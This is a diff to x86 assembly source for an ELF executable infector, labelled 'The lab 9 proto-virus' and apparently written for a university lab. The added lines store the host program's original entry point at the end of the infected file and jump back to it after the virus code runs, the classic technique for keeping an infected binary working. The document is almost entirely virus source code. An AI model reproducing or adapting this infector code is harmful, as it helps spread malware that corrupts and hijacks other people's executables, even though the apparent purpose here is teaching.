@@ -235,6 +235,21 @@ _start:
 	sub ecx,ELFHDR_size
     write dword[ebp-Local_1_EBP_OFFSET],ecx,ELFHDR_size ;writing the newchanged elfhd to our file
 
+	reset_regs
+
+	mov edx, PreviousEntryPoint
+    mov ebx, virus_end
+    sub edx,ebx;edx is length
+    mov ecx,-4
+    lseek dword[ebp-Local_1_EBP_OFFSET],ecx,SEEK_END; last 4 byte are exactly the label PreviousEntryPoint
+    
+    mov eax,0
+    
+    mov eax,ebp
+    sub eax,64
+    write dword[ebp-Local_1_EBP_OFFSET],eax,4; write old enetry to end of file after end virus, old entery is adress to we write 4 bytes
+
+
 
 	.beforeEnd:	
 	close [ebp-Local_1_EBP_OFFSET]
@@ -258,11 +273,19 @@ VirusExit_with_err:
 
 	.print_openFail:
 		print_openFail
-		jmp .exit
+		reset_regs
+		get_symbal_rt_address_to_ecx PreviousEntryPoint
+		mov eax,ecx
+		get_symbal_rt_address_to_ecx VirusExit
+		cmp eax, ecx;
+		jne activateOldEntryPoint
 
 	.exit:
     	exit 1            
 	
+activateOldEntryPoint:
+jmp dword[eax];  jumpint to the old entery point if the file
+
 FileName:	db "ELFexecTestFile", 0
 ;FileName:	db "ELFexec1", 0
 OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
